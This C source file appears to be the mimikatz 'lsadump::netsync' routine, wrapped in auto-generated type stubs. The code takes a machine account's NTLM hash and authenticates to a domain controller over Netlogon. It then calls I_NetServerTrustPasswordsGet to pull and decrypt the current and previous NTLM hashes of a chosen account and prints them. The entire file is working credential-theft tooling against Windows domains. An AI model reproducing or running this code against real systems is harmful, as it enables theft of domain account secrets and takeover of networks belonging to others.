
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_12__ TYPE_2__ ;
typedef struct TYPE_11__ TYPE_1__ ;


typedef int wchar_t ;
typedef int sessionKey ;
typedef int ntlmHash ;
typedef int i ;
struct TYPE_12__ {int digest; } ;
struct TYPE_11__ {char member_0; char member_1; char member_2; char member_3; char member_4; char member_5; char member_6; char member_7; size_t* data; } ;
typedef int* PDWORD64 ;
typedef int * PCWCHAR ;
typedef int PBYTE ;
typedef int NT_OWF_PASSWORD ;
typedef scalar_t__ NTSTATUS ;
typedef TYPE_1__ NETLOGON_CREDENTIAL ;
typedef int NETLOGON_AUTHENTICATOR ;
typedef TYPE_2__ MD5_CTX ;
typedef int LPCBYTE ;
typedef int LPBYTE ;
typedef int LOGONSRV_HANDLE ;
typedef int ENCRYPTED_NT_OWF_PASSWORD ;
typedef size_t DWORD ;
typedef int BYTE ;


 size_t ARRAYSIZE (int *) ;
 int CALG_MD5 ;
 scalar_t__ I_NetServerAuthenticate2 (int ,int *,int ,int *,TYPE_1__*,TYPE_1__*,size_t*) ;
 scalar_t__ I_NetServerReqChallenge (int ,int *,TYPE_1__*,TYPE_1__*) ;
 scalar_t__ I_NetServerTrustPasswordsGet (int ,int *,int ,int *,int *,int *,int *,int *) ;
 int LM_NTLM_HASH_LENGTH ;
 int MD5Final (TYPE_2__*) ;
 int MD5Init (TYPE_2__*) ;
 int MD5Update (TYPE_2__*,size_t*,int) ;
 int MD5_DIGEST_LENGTH ;
 int * MIMIKATZ ;
 scalar_t__ NT_SUCCESS (scalar_t__) ;
 int PRINT_ERROR (char*,...) ;
 int RtlDecryptDES2blocks2keys (int ,int *,int ) ;
 scalar_t__ RtlEqualMemory (size_t*,size_t*,int) ;
 scalar_t__ STATUS_NO_SUCH_USER ;
 scalar_t__ STATUS_SUCCESS ;
 int ServerSecureChannel ;
 int kprintf (char*,...) ;
 int kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator (TYPE_1__*,int,int *,int *) ;
 int kuhl_m_lsadump_netsync_NlComputeCredentials (int ,int ,int *) ;
 int * kuhl_m_lsadump_netsync_sc ;
 scalar_t__ kull_m_crypto_hmac (int ,int *,int,int ,int,int *,int) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,int **,int *) ;
 scalar_t__ kull_m_string_stringToHex (int *,int *,int) ;
 int kull_m_string_wprintf_hex (int *,int,int ) ;

NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
 NTSTATUS status;
 NETLOGON_CREDENTIAL ClientChallenge = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, ServerChallenge, CandidateServerCredential, ClientCredential, ServerCredential;
 NETLOGON_AUTHENTICATOR ClientAuthenticator, ServerAuthenticator;
 BYTE ntlmHash[LM_NTLM_HASH_LENGTH], sessionKey[MD5_DIGEST_LENGTH];
 DWORD i = 0, NegotiateFlags = 0x600FFFFF;
 MD5_CTX ctx;
 ENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, EncryptedOldOwfPassword;
 NT_OWF_PASSWORD NewOwfPassword, OldOwfPassword;
 PCWCHAR szDc, szComputer, szUser, szNtlm, szAccount;

 if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, ((void*)0)))
 {
  if(kull_m_string_args_byName(argc, argv, L"user", &szUser, ((void*)0)))
  {
   kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
   kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
   if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, ((void*)0)))
   {
    if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
    {

     status = I_NetServerReqChallenge((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
     if(NT_SUCCESS(status))
     {

      MD5Init(&ctx);
      MD5Update(&ctx, &i, sizeof(i));
      MD5Update(&ctx, ClientChallenge.data, sizeof(ClientChallenge.data));
      MD5Update(&ctx, ServerChallenge.data, sizeof(ServerChallenge.data));
      MD5Final(&ctx);
      if(kull_m_crypto_hmac(CALG_MD5, ntlmHash, sizeof(ntlmHash), ctx.digest, sizeof(ctx.digest), sessionKey, sizeof(sessionKey)))
      {

       kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ClientChallenge.data, (PBYTE) ClientCredential.data, sessionKey);
       kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ServerChallenge.data, (PBYTE) CandidateServerCredential.data, sessionKey);



       status = I_NetServerAuthenticate2((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
       if(NT_SUCCESS(status))
       {

        if(RtlEqualMemory(CandidateServerCredential.data, ServerCredential.data, sizeof(CandidateServerCredential.data)))
        {

         for(status = STATUS_NO_SUCH_USER, i = 0; (status == STATUS_NO_SUCH_USER) && (i < ARRAYSIZE(kuhl_m_lsadump_netsync_sc)); i++)
         {
          kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);

          status = I_NetServerTrustPasswordsGet((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
          if(NT_SUCCESS(status))
          {
           kprintf(L"  Account: %s\n", szAccount);
           RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword);
           RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword);
           kprintf(L"  NTLM   : "); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
           kprintf(L"  NTLM-1 : "); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
          }
          *(PDWORD64) ClientCredential.data += 1;
         }
         if(!NT_SUCCESS(status))
          PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
        }
        else PRINT_ERROR(L"ServerCredential does not match CandidateServerCredential\n");
       }
       else PRINT_ERROR(L"I_NetServerAuthenticate2 (0x%08x)\n", status);
      }
     }
     else PRINT_ERROR(L"I_NetServerReqChallenge (0x%08x)\n", status);
    }
    else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
   }
   else PRINT_ERROR(L"Missing argument : ntlm\n");
  }
  else PRINT_ERROR(L"Missing argument : user\n");
 }
 else PRINT_ERROR(L"Missing argument : dc\n");
 return STATUS_SUCCESS;
}
